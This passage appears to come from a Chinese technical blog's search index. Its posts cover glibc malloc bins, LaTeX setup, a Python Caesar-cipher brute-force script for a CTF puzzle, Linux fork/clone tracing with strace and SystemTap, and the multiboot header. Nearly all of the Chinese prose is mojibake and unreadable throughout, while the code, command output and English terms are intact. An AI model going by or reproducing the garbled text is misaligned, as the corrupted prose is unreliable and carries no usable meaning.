remainder chunkä»¥æ”¹å–„å±€éƒ¨æ€§å½“éšåçš„è¯·æ±‚æ˜¯è¯·æ±‚ä¸€å— small chunk å¹¶ä¸” last remainder chunk æ˜¯ unsorted bin ä¸­å”¯ä¸€çš„ chunk,last remainder chunk å°±åˆ†å‰²æˆä¸¤éƒ¨åˆ†: è¿”å›ç»™ç”¨æˆ·çš„ user chunk, æ·»åŠ åˆ° unsorted bin ä¸­çš„ remainder chunk. æ­¤å¤–, è¿™ä¸€ remainder chunk è¿˜ä¼šæˆä¸ºæœ€æ–°çš„ last remainder chunk. å› æ­¤éšåçš„å†…å­˜åˆ†é…æœ€ç»ˆå¯¼è‡´å„ chunk è¢«åˆ†é…å¾—å½¼æ­¤è´´è¿‘. free operation: å½“é‡Šæ”¾ small chunk çš„æ—¶å€™ï¼Œå…ˆæ£€æŸ¥è¯¥ chunk ç›¸é‚»çš„ chunk æ˜¯å¦ä¸º free, å¦‚æœæ˜¯çš„è¯å°±è¿›è¡Œåˆå¹¶æ“ä½œï¼šåˆå¹¶æˆæ–°çš„ chunk, ç„¶åå°†å®ƒä»¬ä» small bin ä¸­ç§»åŠ¨åˆ° unsorted bin ä¸­ã€‚ large bins number: 63 chunk_size: å‰ 32 ä¸ª large_bin ä¾æ¬¡ä»¥ 64 å­—èŠ‚é€’å¢ï¼Œå³ç¬¬ä¸€ä¸ª large bin ä¸­ chunk size ä¸º 512-575 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª large bin ä¸­ chunk size ä¸º 576-639 å­—èŠ‚ï¼Œç´§éšå…¶åçš„ 16 ä¸ª large bin ä¾æ¬¡ä»¥ 512 å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”; ä¹‹åçš„ 8 ä¸ª bin ä»¥æ­¥é•¿ 4096 ä¸ºé—´éš”; å†ä¹‹åçš„ 4 ä¸ª bin ä»¥ 32768 å­—èŠ‚ä¸ºé—´éš”; ä¹‹åçš„ 2 ä¸ª bin ä»¥ 262144 å­—èŠ‚ä¸ºé—´éš”; å‰©ä¸‹çš„ chunk æ”¾åœ¨æœ€åä¸€ä¸ª large bin ä¸­ï¼Œlarge bin çš„ä½ç½®æ˜¯é€’å‡çš„ã€‚ merge operation: ç›¸é‚»çš„ free_chunk åˆå¹¶ä¸ºä¸€ä¸ªæ›´å¤§çš„ free_chunk. malloc operation: åˆå§‹åŒ–å®Œæˆä¹‹å‰çš„æ“ä½œç±»ä¼¼äº small_bin, åˆå§‹åŒ–å®Œæˆä¹‹åï¼Œé¦–å…ˆç¡®å®šç”¨æˆ·è¯·æ±‚çš„å¤§å°å±äºå“ªä¸€ä¸ª large bin, ç„¶ååˆ¤æ–­è¯¥ large bin ä¸­æœ€å¤§çš„ chunk çš„ size æ˜¯å¦å¤§äºç”¨æˆ·è¯·æ±‚çš„ size. å¦‚æœå¤§äºï¼Œå°±ä»å°¾å¼€å§‹éå†è¯¥ large bin, æ‰¾åˆ°ç¬¬ä¸€ä¸ª size ç›¸ç­‰æˆ–æ¥è¿‘çš„ chunk, åˆ†é…ç»™ç”¨æˆ·ã€‚å¦‚æœè¯¥ chunk å¤§äºç”¨æˆ·è¯·æ±‚çš„ size çš„è¯ï¼Œå°±å°†è¯¥ chunk æ‹†åˆ†ä¸ºä¸¤ä¸ª chunkï¼šå‰è€…è¿”å›ç»™ç”¨æˆ·ï¼Œä¸” size ç­‰åŒäºç”¨æˆ·è¯·æ±‚çš„ sizeï¼›å‰©ä½™çš„éƒ¨åˆ†åšä¸ºä¸€ä¸ªæ–°çš„ chunk æ·»åŠ åˆ° unsorted bin ä¸­ã€‚ å¦‚æœå°äºï¼Œé‚£ä¹ˆå°±ä¾æ¬¡æŸ¥çœ‹åç»­çš„ large bin ä¸­æ˜¯å¦æœ‰æ»¡è¶³éœ€æ±‚çš„ chunk, éœ€è¦æ³¨æ„çš„æ˜¯é‰´äº bin çš„ä¸ªæ•°è¾ƒå¤š (ä¸åŒ bin ä¸­çš„ chunk ææœ‰å¯èƒ½åœ¨ä¸åŒçš„å†…å­˜é¡µä¸­), å¦‚æœæŒ‰ç…§ä¸Šä¸€æ®µä¸­ä»‹ç»çš„æ–¹æ³•è¿›è¡Œéå†çš„è¯ (å³éå†æ¯ä¸ª bin ä¸­çš„ chunk), å¯èƒ½ä¼šå‘ç”Ÿå¤šæ¬¡page_fault, è¿›è€Œä¸¥é‡å½±å“é€Ÿåº¦ï¼Œæ‰€ä»¥ ptmalloc è®¾è®¡äº† Binmap ç»“æ„ä½“æ¥å¸®åŠ©æé«˜ bin-by-bin çš„æ£€ç´¢é€Ÿåº¦.Bitmap è®°å½•äº†å„ä¸ª bin ä¸­æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœé€šè¿‡ binmap æ‰¾åˆ°äº†ä¸‹ä¸€ä¸ªéç©ºçš„ large bin çš„è¯ï¼Œå°±æŒ‰ç…§ä¸Šä¸€æ®µä¸­çš„æ–¹æ³•åˆ†é… chunk, å¦åˆ™å°±ä½¿ç”¨ top chunk æ¥åˆ†é…åˆé€‚çš„å†…å­˜ã€‚ free opertation: å½“é‡Šæ”¾ large chunk çš„æ—¶å€™ï¼Œå…ˆæ£€æŸ¥è¯¥ chunk ç›¸é‚»çš„ chunk æ˜¯å¦ä¸º free, å¦‚æœæ˜¯çš„è¯å°±è¿›è¡Œåˆå¹¶æ“ä½œï¼šå°†è¿™äº› chunks åˆå¹¶æˆæ–°çš„ chunk, åå°†å®ƒä»¬ç§»åˆ° unsorted bin. unsorted binså›æ”¶çš„ chunk å—å¿…é¡»å…ˆæ”¾åˆ° unsorted bins ä¸­ï¼Œåˆ†é…å†…å­˜æ—¶ä¼šæŸ¥çœ‹ unsorted bins ä¸­æ˜¯å¦æœ‰åˆé€‚çš„ chunk, å¦‚æœæ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ chunk, åˆ™ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™ unsorted bins çš„æ‰€æœ‰ chunk æ”¾å…¥ small_bin æˆ–æ˜¯ large_bin ä¸­ã€‚ number: 1 ä¸ª chunk size: æ— é™åˆ¶ large references[^Understanding]: Understanding glibc malloc[^freebuf1]: Linux å †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æï¼ˆä¸Šï¼‰[^freebuf2]: Linux å †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æï¼ˆä¸‹ï¼‰[^source]: glibc å†…å­˜ç®¡ç† ptmalloc æºä»£ç åˆ†æ.pdf[^layout]: memory layout[^wiki]: glibc&#x2F;wiki&#x2F;","tags":["linux"]},{"title":"install latex","path":"/2016/05/24/latex/","content":"0x00 installä¸å¾—ä¸è¯´ latex æ‰‹å·¥å®‰è£…å¾ˆéº»çƒ¦ï¼Œä¸€æ¬¡å®‰è£…é½äº†å®åŒ…å¾ˆçœå¿ƒã€‚ 0x01 fedora24å®‰è£…å‘½ä»¤ï¼š 123dnf install texlive-collection-fontsrecommended texlive-xetex texlive-latex \\ texlive-titlesec &#x27;tex(datetime.sty)&#x27; &#x27;tex(eu1enc.def)&#x27; &#x27;tex(polyglossia.sty)&#x27; dnf install texlive-mdframed\\* 0x02 macmac ä¸‹é¢ç›´æ¥å®‰è£… texlive, å®‰è£…å¥½äº†è¿‡åæ³¨æ„è®¾ç½®ä¸€ä¸‹PATH. 0x10 fonts0x11 fedora24æŠŠä¸‹é¢é“¾æ¥ ^fonts é‡Œé¢çš„å‹ç¼©åŒ…è§£å‹æ”¾åˆ°ç³»ç»Ÿå­—ä½“è·¯å¾„é‡Œé¢ã€‚ 12# cat /usr/share/texlive/texmf.cnf OSFONTDIR = /usr/share/fonts// 0x12 macä¹Ÿæ˜¯è¦æ³¨æ„è®¾ç½®å­—ä½“ç›¸å…³é€‰é¡¹ã€‚","tags":["tips"]},{"title":"caesar brute force","path":"/2016/05/22/caesar/","content":"0x00 Caesar encryptionä¹‹å‰ç© ctf é‡åˆ°çš„è¿™ä¸ªç±»å‹é¢˜ç›®ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬æ¥ç ´è§£ï¼Œæš´åŠ›ç ´è§£ç›¸å¯¹çŒœ key æ¥è¯´ç®€å•ä¸€äº›ï¼Œæ‰€æœ‰è„šæœ¬åªæ”¯æŒæš´åŠ›ç ´è§£ï¼Œä¸è¿‡ç®—æ³•å¯ä»¥å•ç‹¬å–å‡ºæ¥ç”¨ã€‚ 0x01 implementationå…³äºè¿™ä¸ªå¯†ç æ•…äº‹å‚è€ƒ [^wiki]. 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python3&#x27;&#x27;&#x27;This script for Caesar brute decryption.&#x27;&#x27;&#x27;__author__ = &quot;Sn0rt@abc.shop.edu.cn&quot;import stringMAX_KEY_SZIE = 26def get_message(): print(&#x27;enter you message: &#x27;) return input().lower()def brute(message): for key in range(1, MAX_KEY_SZIE + 1): print(&quot;%s&quot; % decryption(key, message))def decryption(key, message): key = 0 - key transled = &#x27;&#x27; for symbol in message: if symbol.isalpha(): num = ord(symbol) num += key if num &gt; ord(&#x27;z&#x27;): num -= 26 elif num &lt; ord(&#x27;a&#x27;): num += 26 transled += chr(num) else: transled += symbol return transledbrute(get_message())","tags":["cryptography"]},{"title":"how to create a process","path":"/2016/05/07/how-to-create-process/","content":"åœ¨æ“ä½œç³»ç»Ÿæ•™ç§‘ä¹¦ä¸­è¿›ç¨‹æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼Œä¹¦ä¸­å®šä¹‰ä¸ºâ€œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½â€,åˆæ­¥æ¥è§¦ Linux kernel å‡†å¤‡è¿›ç¨‹æ¦‚å¿µå¼€å§‹ã€‚ 0x00 process descriptoråœ¨ Linux ä¸­è¡¨ç¤º PCBï¼ˆè¿›ç¨‹æ§åˆ¶å—ï¼‰çš„ç»“æ„ä½“å« task_struct. task_strcut ç›¸å…³çš„ä¿¡æ¯æ”¾åœ¨ include&#x2F;linux&#x2F;sched.h ä¸­ï¼Œè€Œå•ç‹¬çœ‹ task_struct æ„ä¹‰ä¸æ˜¯å¾ˆå¤§ï¼Œå¾ˆéš¾æŠŠæ¡åˆ° Linux çš„è¿›ç¨‹å·¥ä½œåŸç†ï¼Œæ‰€ä»¥æ‰æœ‰äº†æœ¬æ–‡æ¥æ¢³ç† Linux è¿›ç¨‹ç®¡ç†çš„ä¿¡æ¯ã€‚ 0x01 how to crate a process ?å¯ä»¥é€šè¿‡ fork ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ 1234567891011121314#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(void)&#123; pid_t pid; pid = fork(); if (pid == 0) &#123; printf(&quot;child &quot;); &#125; else &#123; printf(&quot;parent &quot;); &#125; return 0;&#125; Linux ä¸‹åˆ›å»ºè¿›ç¨‹ä¼šå®Œå…¨å¤åˆ¶å®ƒçš„çˆ¶è¿›ç¨‹ï¼Œæ‰€ä»¥ fork è°ƒç”¨æˆåŠŸè¿”å›ä¸¤æ¬¡ï¼Œåœ¨çˆ¶è¿›ç¨‹ä¸­èŒƒå›´å­è¿›ç¨‹ pidï¼Œå­è¿›ç¨‹ä¸­è¿”å› 0ã€‚ 0x02 what happened in kernel ?è¿™é‡Œéœ€è¦å¼•å…¥ç³»ç»Ÿè°ƒç”¨çš„æ¦‚å¿µï¼Œç®€è€Œè¨€ä¹‹ç³»ç»Ÿè°ƒç”¨æ˜¯ç”¨æˆ·é€šè¿‡ API å’Œç³»ç»Ÿæ²Ÿé€šçš„æ–¹å¼ã€‚ä¸Šè¿°æºä»£ç ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨åœ¨ Linux ä¸­åˆ›å»ºè¿›ç¨‹ã€‚è§‚å¯Ÿç³»ç»Ÿè°ƒç”¨æœ‰ä¸ªå¥½å·¥å…·strace, -fæ˜¯ç»§ç»­è·Ÿè¸ªå­è¿›ç¨‹ã€‚ 123456789101112131415161718192021222324# strace -f ./a.out...clone(strace: Process 2035 attachedchild_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fd18ba619d0) = 2035[pid 2034] fstat(1, &lt;unfinished ...&gt;[pid 2035] fstat(1, &lt;unfinished ...&gt;[pid 2034] &lt;... fstat resumed&gt; &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 5), ...&#125;) = 0[pid 2035] &lt;... fstat resumed&gt; &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 5), ...&#125;) = 0[pid 2034] brk(NULL) = 0xd73000[pid 2034] brk(0xd94000 &lt;unfinished ...&gt;[pid 2035] brk(NULL &lt;unfinished ...&gt;[pid 2034] &lt;... brk resumed&gt; ) = 0xd94000[pid 2034] brk(NULL) = 0xd94000[pid 2034] write(1, &quot;parent &quot;, 7 &lt;unfinished ...&gt;[pid 2035] &lt;... brk resumed&gt; ) = 0xd73000parent [pid 2034] &lt;... write resumed&gt; ) = 7[pid 2034] exit_group(0) = ?[pid 2035] brk(0xd94000 &lt;unfinished ...&gt;[pid 2034] +++ exited with 0 +++&lt;... brk resumed&gt; ) = 0xd94000brk(NULL) = 0xd94000write(1, &quot;child &quot;, 6child ) = 6exit_group(0) = ?+++ exited with 0 +++ å¯ä»¥çœ‹åˆ°åœ¨ x86_64 ä¸‹ fork å‡½æ•°åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ clone (åœ¨è°ƒç”¨ clone ä¹‹å‰çš„ä¸œè¥¿å¯ä»¥åœ¨ glibc) æ¥åšçš„ï¼Œé€šè¿‡ä¸€äº›çœ‹ä¸Šèµ·å¥‡æ€ªçš„ flags çš„ç»„åˆæ¥è¾¾åˆ°åˆ›å»ºä¸€ä¸ªè¿›ç¨‹çš„ç›®çš„ã€‚ç³»ç»Ÿè°ƒç”¨å±‚é¢ä¹‹ä¸‹å°±æ˜¯ Linux kernel äº†ã€‚ ä¸‹é¢é€šè¿‡ kernel 4.12-rc2 æºä»£ç è·Ÿè¸ªä¸€ä¸‹ clone ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ï¼ˆå¤§ä½“æµç¨‹ä¾ç„¶å’Œ ^ulk è¯´çš„ç±»ä¼¼ä½†æ˜¯ï¼Œç»†èŠ‚æœ‰ç‚¹ä¸åŒï¼Œå‚è€ƒ1d4b4b2994b5fc208963c0b795291f8c1f18becfï¼‰ï¼Œclone åœ¨ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„ stub_clone å®ç°ï¼Œstub_clone ç”± sys_clone å®šä¹‰ï¼Œè€Œ sys_clone åœ¨ 64 ä½ä¸‹# define __ARCH_WANT_SYS_CLONEï¼Œååœ¨ fork.c é‡Œé¢è¿›è¡Œæ¡ä»¶ç¼–è¯‘ï¼š 123456789101112131415161718192021222324252627#ifdef __ARCH_WANT_SYS_CLONE#ifdef CONFIG_CLONE_BACKWARDSSYSCALL_DEFINE5(clone, unsigned long, clone_flags, unsigned long, newsp, int __user *, parent_tidptr, unsigned long, tls, int __user *, child_tidptr)#elif defined(CONFIG_CLONE_BACKWARDS2)SYSCALL_DEFINE5(clone, unsigned long, newsp, unsigned long, clone_flags, int __user *, parent_tidptr, int __user *, child_tidptr, unsigned long, tls)#elif defined(CONFIG_CLONE_BACKWARDS3)SYSCALL_DEFINE6(clone, unsigned long, clone_flags, unsigned long, newsp, int, stack_size, int __user *, parent_tidptr, int __user *, child_tidptr, unsigned long, tls)#elseSYSCALL_DEFINE5(clone, unsigned long, clone_flags, unsigned long, newsp, int __user *, parent_tidptr, int __user *, child_tidptr, unsigned long, tls)#endif&#123; return _do_fork(clone_flags, newsp, 0, parent_tidptr, child_tidptr, tls);&#125;#endif çœ‹åˆ° sys_clone å®ç°æ˜¯é…ç½®ç›¸å…³çš„ï¼Œå‚æ•°ä¸åŒï¼Œæœ€åè°ƒç”¨ _do_fork (ä¸åŒäºä¹‹å‰è°ƒç”¨ do_fork) è¿›å…¥ä¸‹ä¸€ä¸ªæµç¨‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/* * Ok, this is the main fork-routine. * * It copies the process, and if successful kick-starts * it and waits for it to finish using the VM if required. */long _do_fork(unsigned long clone_flags, unsigned long stack_start, unsigned long stack_size, int __user *parent_tidptr, int __user *child_tidptr, unsigned long tls)&#123; struct task_struct *p; int trace = 0; long nr; /* * Determine whether and which event to report to ptracer. When * called from kernel_thread or CLONE_UNTRACED is explicitly * requested, no event is reported; otherwise, report if the event * for the type of forking is enabled. */ if (!(clone_flags &amp; CLONE_UNTRACED)) &#123; if (clone_flags &amp; CLONE_VFORK) trace = PTRACE_EVENT_VFORK; else if ((clone_flags &amp; CSIGNAL) != SIGCHLD) trace = PTRACE_EVENT_CLONE; else trace = PTRACE_EVENT_FORK; if (likely(!ptrace_event_enabled(current, trace))) trace = 0; &#125; p = copy_process(clone_flags, stack_start, stack_size, child_tidptr, NULL, trace, tls, NUMA_NO_NODE); add_latent_entropy(); /* * Do this prior waking up the new thread - the thread pointer * might get invalid after that point, if the thread exits quickly. */ if (!IS_ERR(p)) &#123; struct completion vfork; struct pid *pid; trace_sched_process_fork(current, p); pid = get_task_pid(p, PIDTYPE_PID); nr = pid_vnr(pid); if (clone_flags &amp; CLONE_PARENT_SETTID) put_user(nr, parent_tidptr); if (clone_flags &amp; CLONE_VFORK) &#123; p-&gt;vfork_done = &amp;vfork; init_completion(&amp;vfork); get_task_struct(p); &#125; wake_up_new_task(p); /* forking complete and child started to run, tell ptracer */ if (unlikely(trace)) ptrace_event_pid(trace, pid); if (clone_flags &amp; CLONE_VFORK) &#123; if (!wait_for_vfork_done(p, &amp;vfork)) ptrace_event_pid(PTRACE_EVENT_VFORK_DONE, pid); &#125; put_pid(pid); &#125; else &#123; nr = PTR_ERR(p); &#125; return nr;&#125; _do_forkå‡½æ•°ä¸æ˜¯å¾ˆé•¿ï¼Œä¸»è¦åšäº†å‡ ä»¶äº‹æƒ… (å› ä¸ºæ²¡æœ‰ vfork æ‰€ä»¥ä¸å…³æ³¨å®ƒçš„å¤„ç†è·¯å¾„)ï¼š copy_process å‡½æ•°å‡†å¤‡è¿›è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚ å¦‚æœ p æœ‰æ•ˆï¼Œé€šè¿‡ get_task_pid åˆ†é… pidï¼Œé€šè¿‡ wake_up_new_task å°†æ–° p åŠ å…¥è°ƒåº¦å™¨ã€‚ è¿™é‡Œéœ€è¦å¼•å…¥systemtapæ¥è§‚å¯Ÿ kernelï¼Œå·¥ä½œåŸç†ç®€è€Œè¨€ä¹‹å°±æ˜¯åœ¨é€šè¿‡è°ƒè¯•ä¿¡æ¯åœ¨å†…æ ¸å‡½æ•°è°ƒç”¨ä¹‹å‰æˆ–ä¹‹åæ’å…¥ä¸€äº›é¢„å®šä¹‰çš„ä»£ç ã€‚ 1234probe kernel.function(&quot;_do_fork&quot;).return &#123; printf(&quot;sys_clone hit &quot;); printf(&quot;do_frok return pid: %d &quot;, $return);&#125; å¯ä»¥çœ‹_do_fork ä»£ç çœ‹åˆ°è¿”å›å€¼æ˜¯æ–°è¿›ç¨‹çš„ pidï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å®ƒçš„æ¢å›ç‚¹éªŒè¯ä¸€ä¸‹å’Œç”¨æˆ·æ€å¯¹æ¯”ã€‚ systemtap è¾“å‡ºï¼š 12345678910111213141516171819202122232425stap -v fork.stpPass 1: parsed user script and 468 library scripts using 245968virt/45604res/7552shr/38236data kb, in 100usr/10sys/108real ms.Pass 2: analyzed script: 1 probe, 1 function, 0 embeds, 0 globals using 296808virt/97496res/8480shr/89076data kb, in 830usr/80sys/811real ms.Pass 3: using cached /root/.systemtap/cache/e4/stap_e4791a38e6be5d0d214949ecb8993460_1754.cPass 4: using cached /root/.systemtap/cache/e4/stap_e4791a38e6be5d0d214949ecb8993460_1754.koPass 5: starting run.sys_clone hitdo_fork return pid: 3584sys_clone hitdo_fork return pid: 3585sys_clone hitdo_fork return pid: 3586sys_clone hitdo_fork return pid: 3587sys_clone hitdo_fork return pid: 3588sys_clone hitdo_fork return pid: 3589sys_clone hitdo_fork return pid: 3590sys_clone hitdo_fork return pid: 3591sys_clone hitdo_fork return pid: 3592^CPass 5: run completed in 0usr/90sys/21392real ms. strace è¾“å‡ºï¼š 1234567891011121314151617181920212223242526272829303132strace ./a.outexecve(&quot;./a.out&quot;, [&quot;./a.out&quot;], 0x7ffe513d4180 /* 32 vars */) = 0brk(NULL) = 0x9fa000mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7c33df3000access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory)open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=67254, ...&#125;) = 0mmap(NULL, 67254, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7c33de2000close(3) = 0open(&quot;/lib64/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0 \\6\\2\\0\\0\\0\\0\\0&quot;..., 832) = 832fstat(3, &#123;st_mode=S_IFREG|0755, st_size=2163016, ...&#125;) = 0mmap(NULL, 4000032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f7c337fe000mprotect(0x7f7c339c5000, 2097152, PROT_NONE) = 0mmap(0x7f7c33bc5000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c7000) = 0x7f7c33bc5000mmap(0x7f7c33bcb000, 14624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f7c33bcb000close(3) = 0mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7c33ddf000arch_prctl(ARCH_SET_FS, 0x7f7c33ddf700) = 0mprotect(0x7f7c33bc5000, 16384, PROT_READ) = 0mprotect(0x600000, 4096, PROT_READ) = 0mprotect(0x7f7c33df5000, 4096, PROT_READ) = 0munmap(0x7f7c33de2000, 67254) = 0clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f7c33ddf9d0) = 3587child fstat(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...&#125;) = 0--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=3587, si_uid=0, si_status=0, si_utime=0, si_stime=0&#125; ---brk(NULL) = 0x9fa000brk(0xa1b000) = 0xa1b000brk(NULL) = 0xa1b000write(1, &quot;parent &quot;, 7parent ) = 7exit_group(0) = ?+++ exited with 0 +++ å¯ä»¥çœ‹åˆ°cloneç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼å’Œ_do_forkè¿”å›å€¼ä¸€è‡´ï¼Œåªæ˜¯ä¸­é—´å¤šç”Ÿæˆäº†å…¶ä»–è¿›ç¨‹ã€‚","tags":["linux"]},{"title":"multiboot specification","path":"/2016/04/11/multiboot/","content":"0x00 backgroundå‡†å¤‡å†™ä¸€ä¸ªç©å…·æ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥å¯åŠ¨è¿‡ç¨‹å°‘ä¸äº†ï¼Œä¸è¿‡å¯åŠ¨è¿‡ç¨‹å‘¨æœŸåªæœ‰ä¸€æ¬¡ï¼Œä¸”ç»†èŠ‚ç¹å¤ï¼Œå•è°ƒã€‚å› ä¸ºç©å…·ç³»ç»Ÿæ˜¯åŸºäº x86 çš„ï¼Œå¼•ç”¨ç¤¾åŒºè§£å†³æ–¹æ¡ˆ multiboot[^multiboot] å¯ä»¥æ¨¡ç³Š x86 æ¶æ„ç³»ç»Ÿç›¸å…³ç»†èŠ‚ã€‚ 0x01 OS image formatSmall OS è¢«è®¾è®¡ä¸ºåŸºäº IA32 ä¸”æ˜¯ multiboot os è¿™æ ·å®ƒå¯èƒ½è¢«é“¾æ¥åˆ°ä¸€ä¸ªéé»˜è®¤åŠ è½½åœ°å€ä»¥é¿å¼€ PC çš„ I&#x2F;O åŒºåŸŸæˆ–è€…å…¶å®ƒçš„ä¿ç•™åŒºåŸŸï¼Œä½†ä½œä¸º multiboot OS å¿…é¡»å…·æœ‰ä¸€ä¸ªè¢«ç§°ä¸º multiboot header çš„å¤´éƒ¨ä¿¡æ¯ï¼Œä¸”å¿…é¡»å®Œæ•´çš„åŒ…å«åœ¨ OS çš„å‰ 8192 å­—èŠ‚å†…ä¸” 4 å­—èŠ‚å¯¹é½ã€‚ 12345678910MBOOT_PAGE_ALIGN equ 1 &lt;&lt; 0 ; Bit 0MBOOT_MEM_INFO equ 1 &lt;&lt; 1MBOOT_HEADER_MAGIC equ 0x1BADB002 ; Magic number from mboot standarMBOOT_HEADER_FLAGS equ MBOOT_PAGE_ALIGN | MBOOT_MEM_INFOMBOOT_HEADER_CHECKSUM equ -(MBOOT_HEADER_MAGIC+MBOOT_HEADER_FLAGS)section .textdd MBOOT_HEADER_MAGICdd MBOOT_HEADER_FLAGSdd MBOOT_HEADER_CHECKSUM MagicMagic åŸŸæ˜¯æ ‡å¿—å¤´çš„é­”æ•°ï¼Œå®ƒå¿…é¡»ç­‰äºåå…­è¿›åˆ¶å€¼ 0x1BADB002. FlagsFlags åŸŸæŒ‡å‡º OS æ˜ åƒéœ€è¦å¼•å¯¼ç¨‹åºæä¾›æˆ–æ”¯æŒçš„ç‰¹æ€§ã€‚0-15 ä½æŒ‡å‡ºéœ€æ±‚ï¼šå¦‚æœå¼•å¯¼ç¨‹åºå‘ç°æŸäº›å€¼è¢«è®¾ç½®ä½†å‡ºäºæŸç§åŸå› ä¸ç†è§£æˆ–ä¸èƒ½ä¸èƒ½æ»¡è¶³ç›¸åº”çš„éœ€æ±‚ï¼Œå®ƒå¿…é¡»å‘ŠçŸ¥ç”¨æˆ·å¹¶å®£å‘Šå¼•å¯¼å¤±è´¥ã€‚16-31 ä½æŒ‡å‡ºå¯é€‰çš„ç‰¹æ€§ï¼šå¦‚æœå¼•å¯¼ç¨‹åºä¸èƒ½æ”¯æŒæŸäº›ä½ï¼Œå®ƒå¯ä»¥ç®€å•çš„å¿½ç•¥å®ƒä»¬å¹¶æ­£å¸¸å¼•å¯¼ã€‚æ‰€æœ‰ flags å­—ä¸­å°šæœªå®šä¹‰çš„ä½å¿…é¡»è¢«ç½®ä¸º 0. è¿™æ ·ï¼Œflags åŸŸæ—¢å¯ä»¥ç”¨äºç‰ˆæœ¬æ§åˆ¶ä¹Ÿå¯ä»¥ç”¨äºç®€å•çš„ç‰¹æ€§é€‰æ‹©ã€‚å¦‚æœè®¾ç½®äº† flags å­—ä¸­çš„ 0 ä½ï¼Œæ‰€æœ‰çš„å¼•å¯¼æ¨¡å—å°†æŒ‰é¡µï¼ˆ4KBï¼‰è¾¹ç•Œå¯¹é½ã€‚æœ‰äº›æ“ä½œç³»ç»Ÿèƒ½å¤Ÿåœ¨å¯åŠ¨æ—¶å°†åŒ…å«å¼•å¯¼æ¨¡å—çš„é¡µç›´æ¥æ˜ å°„åˆ°ä¸€ä¸ªåˆ†é¡µçš„åœ°å€ç©ºé—´ï¼Œå› æ­¤éœ€è¦å¼•å¯¼æ¨¡å—æ˜¯é¡µå¯¹é½çš„ã€‚å¦‚æœè®¾ç½®äº† flags å­—ä¸­çš„ 1 ä½ï¼Œåˆ™å¿…é¡»é€šè¿‡ Multiboot ä¿¡æ¯ç»“æ„çš„ mem_*åŸŸåŒ…æ‹¬å¯ç”¨å†…å­˜çš„ä¿¡æ¯ã€‚å¦‚æœå¼•å¯¼ç¨‹åºèƒ½å¤Ÿä¼ é€’å†…å­˜åˆ†å¸ƒå¹¶ä¸”å®ƒç¡®å®å­˜åœ¨ï¼Œåˆ™ä¹ŸåŒ…æ‹¬å®ƒã€‚å¦‚æœè®¾ç½®äº† flags å­—ä¸­çš„ 2 ä½ï¼Œæœ‰å…³è§†é¢‘æ¨¡å¼è¡¨çš„ä¿¡æ¯å¿…é¡»å¯¹å†…æ ¸æœ‰æ•ˆã€‚å¦‚æœè®¾ç½®äº† flags å­—ä¸­çš„ 16 ä½ï¼Œåˆ™ Multiboot å¤´ä¸­åç§»é‡ 8-24 çš„åŸŸæœ‰æ•ˆï¼Œå¼•å¯¼ç¨‹åºåº”è¯¥ä½¿ç”¨å®ƒä»¬è€Œä¸æ˜¯å®é™…å¯æ‰§è¡Œå¤´ä¸­çš„åŸŸæ¥è®¡ç®—å°† OS æ˜ è±¡è½½å…¥åˆ°é‚£é‡Œã€‚å†…æ ¸æ˜ è±¡ä¸º ELF æ ¼å¼åˆ™ä¸å¿…æä¾›è¿™æ ·çš„ä¿¡æ¯ã€‚ ChecksumChecksum åŸŸ checksum æ˜¯ä¸€ä¸ª 32 ä½çš„æ— ç¬¦å·å€¼ï¼Œå½“ä¸å…¶ä»–çš„ magic åŸŸï¼ˆä¹Ÿå°±æ˜¯ magic å’Œ flagsï¼‰ç›¸åŠ æ—¶ï¼Œç»“æœå¿…é¡»æ˜¯ 32 ä½çš„æ— ç¬¦å·å€¼ 0ï¼ˆå³ 